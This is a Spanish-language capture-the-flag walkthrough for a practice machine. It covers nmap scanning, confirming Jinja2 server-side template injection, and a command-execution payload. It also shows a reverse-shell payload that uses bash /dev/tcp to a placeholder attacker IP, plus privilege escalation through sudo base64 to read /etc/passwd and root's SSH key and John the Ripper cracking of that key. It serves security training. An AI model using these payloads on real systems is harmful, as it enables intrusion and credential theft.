## 1. Reconocimiento Inicial con Nmap

Realizamos un escaneo exhaustivo con `nmap` para detectar puertos abiertos, sus versiones y el sistema operativo. Esto nos proporciona una visión general de los servicios expuestos y posibles vulnerabilidades asociadas a sus versiones.

```bash
nmap -O -sC -sV <IP_DEL_OBJETIVO>
```

**Resultados Clave:**

*   `22/tcp open ssh OpenSSH 9.2p1 Debian`: El puerto 22 (estándar para SSH) está abierto, lo que indica que podemos intentar acceder al sistema por esta vía si encontramos credenciales.
*   `80/tcp open http Apache httpd 2.4.59`: El puerto 80 está abierto y ejecuta un servidor web Apache. **La página por defecto de Apache no revela información útil inicialmente.**
*   `8089/tcp open http Werkzeug httpd 2.2.2 (Python 3.11.2)`: El puerto 8089 está abierto y ejecuta un servidor web `Werkzeug` con Python. Este es un punto de interés, ya que las aplicaciones web personalizadas a menudo contienen vulnerabilidades.

## 2. Enumeración Web y Descubrimiento de SSTI

Nos centramos en el puerto 8089, ya que es el servicio más prometedor para encontrar una vulnerabilidad.

### 2.1. Exploración del Puerto 8089

Al acceder a `http://<IP_DEL_OBJETIVO>:8089/`, encontramos una página web simple con un campo de entrada. Al introducir texto como "Hola", la página responde con "Hola Hola". Este comportamiento, donde la entrada del usuario se repite directamente en la salida, es un fuerte indicador de una posible vulnerabilidad de Server-Side Template Injection (SSTI).

![P_8089.png](https://github.com/WebReconSpider/the-hackbook/blob/main/Ejercicios/DockerLabs/2Facil/Imagenes/Verdejo_P_8089.png)

### 2.2. Confirmación de SSTI con Jinja2

Para confirmar la vulnerabilidad SSTI y determinar el motor de plantillas, probamos una expresión matemática simple dentro de la sintaxis de plantillas de Jinja2, que es común en aplicaciones Python como las que usan Werkzeug.

Introducimos `{{7*7}}` en el campo de entrada. Si la página devuelve `49`, esto confirma la vulnerabilidad SSTI y que el motor de plantillas es Jinja2. Esto significa que la aplicación web procesa la entrada del usuario a través de un motor de plantillas en el servidor sin una validación adecuada, permitiendo la inyección de código de plantilla malicioso.

![Verdejo_49](https://github.com/WebReconSpider/the-hackbook/blob/main/Ejercicios/DockerLabs/2Facil/Imagenes/Verdejo_49.png)

## 3. Obtención de Reverse Shell (RCE)

Una vez confirmada la SSTI, podemos explotarla para ejecutar comandos en el sistema y obtener una shell inversa.

### 3.1. Ejecución de Comandos Arbitrarios

Utilizamos una carga útil (payload) de Jinja2 que nos permite ejecutar comandos del sistema operativo. Este payload utiliza la capacidad de Jinja2 para acceder a objetos globales de Python y ejecutar funciones del módulo `os`.

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read() }}
```

Al introducir este payload en el campo de entrada, la página debería devolver la salida del comando `id`, confirmando la ejecución de comandos.

### 3.2. Ejecución de Reverse Shell

Ahora que podemos ejecutar comandos, inyectamos un payload de reverse shell para obtener una conexión interactiva a nuestra máquina atacante.

**Payload de Reverse Shell (Jinja2):**

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__(\'os\').popen(\'bash -c \\\'bash -i >& /dev/tcp/<IP_DE_TU_KALI>/443 0>&1\\\'\').read() }}
```

*   `os.popen()`: Ejecuta un comando en una subshell.
*   `bash -c '...'`: Ejecuta un comando bash.
*   `bash -i`: Inicia una shell interactiva.
*   `>& /dev/tcp/<IP_DE_TU_KALI>/443 0>&1`: Redirige la entrada y salida estándar a una conexión TCP a la IP de nuestra máquina atacante en el puerto 443.

**En la Máquina Atacante:**

Antes de introducir el payload, configuramos un `netcat` listener en nuestra máquina atacante para recibir la conexión entrante en el puerto 443.

```bash
nc -lvnp 443
```

Después de configurar el listener, introducimos el payload en el campo de entrada de la página web. Esto ejecutará el código y nos dará una shell inversa en nuestra máquina atacante. Confirmamos que estamos como el usuario `www-data`.

## 4. Escalada de Privilegios

Una vez que tenemos una shell como `www-data`, el objetivo es escalar privilegios a `root`.

### 4.1. Verificación de Permisos Sudo

Verificamos qué comandos puede ejecutar el usuario actual con `sudo` sin necesidad de contraseña. Esto se hace con el comando `sudo -l`.

```bash
sudo -l
```

**Resultados Clave:**

*   `(root) NOPASSWD: /usr/bin/base64`

Esto significa que el usuario actual puede ejecutar el binario `/usr/bin/base64` como `root` sin necesidad de introducir su contraseña. El comando `base64` se utiliza para codificar y decodificar datos, y puede ser abusado para leer o escribir archivos con privilegios elevados.

### 4.2. Abuso de `base64` para Modificar `/etc/passwd`

La técnica para escalar privilegios con `base64` cuando tiene permisos `NOPASSWD` en `sudo` implica modificar el archivo `/etc/passwd` para eliminar la contraseña del usuario `root`. Esto nos permitirá iniciar sesión como `root` sin contraseña.

1.  **Leer `/etc/passwd`:** Primero, leemos el contenido de `/etc/passwd` utilizando `base64` con `sudo` y lo decodificamos.

    ```bash
    LFILE=/etc/passwd
    sudo base64 "$LFILE" | base64 --decode
    ```

    Esto nos mostrará el contenido del archivo, incluyendo la línea de `root`:
    `root:x:0:0:root:/root:/bin/bash`

2.  **Modificar el contenido:** Copiamos el contenido de `/etc/passwd` a un archivo temporal en nuestra máquina atacante (o en el sistema comprometido si tenemos permisos de escritura en algún directorio). Luego, eliminamos la `x` de la entrada de `root`. La línea debe cambiar a `root::0:0:root:/root:/bin/bash`.

3.  **Codificar el contenido modificado:** Codificamos el archivo modificado de nuevo a Base64 y lo guardamos en un archivo.

4.  **Sobrescribir `/etc/passwd` con `base64`:** Utilizamos `base64` con `sudo` para decodificar el contenido modificado y redirigir la salida al archivo `/etc/passwd`.
```bash
sudo -u root /usr/bin/base64 --decode passwd.txt > /etc/passwd
```

Como no podemos modificar este archivo vamos a buscar la clave de ssh

### 4.3. Escalada de Privilegios Alternativa (Clave SSH)

Si la modificación de `/etc/passwd` no es posible o preferible, otra vía para escalar privilegios es buscar claves SSH privadas del usuario `root`.

1.  **Leer la clave SSH privada de `root`:** Utilizamos `base64` con `sudo` para leer el archivo `id_rsa` de `root` y lo decodificamos.

    ```bash
    sudo -u root base64 /root/.ssh/id_rsa | base64 --decode
    ```

    Esto nos devolverá el contenido de la clave SSH privada de `root`.

2.  **Guardar la clave:** Copiamos el contenido de la clave SSH a un archivo local en nuestra máquina atacante (por ejemplo, `id_rsa_root`).

3.  **Establecer permisos:** Las claves SSH privadas requieren permisos estrictos para ser utilizadas.

    ```bash
    chmod 600 id_rsa_root
    ```

4.  **Intentar conexión SSH como `root`:** Intentamos conectarnos vía SSH como `root` utilizando la clave privada.

    ```bash
    ssh -i id_rsa_root root@<IP_DEL_OBJETIVO>
    ```

    La clave está protegida con una frase de contraseña.

### 4.4. Cracking de la Frase de Contraseña

Si la clave SSH está protegida con una frase de contraseña, podemos intentar crackearla utilizando `ssh2john` y `john` (John the Ripper).

1.  **Convertir la clave a formato John:**

    ```bash
    ssh2john id_rsa_root > key.hash
    ```

2.  **Crackear la frase de contraseña:**

    ```bash
    john key.hash --wordlist=/path/to/wordlist/rockyou.txt
    ```

    Una vez crackeada, `john --show key.hash` nos mostrará la frase de contraseña (por ejemplo, `honda1`).

3.  **Conexión SSH con la frase de contraseña:** Volvemos a intentar la conexión SSH con la clave y la frase de contraseña obtenida.

    ```bash
    ssh -i id_rsa_root root@<IP_DEL_OBJETIVO>
    ```

    Una vez dentro, `whoami` confirmará el acceso como `root`.
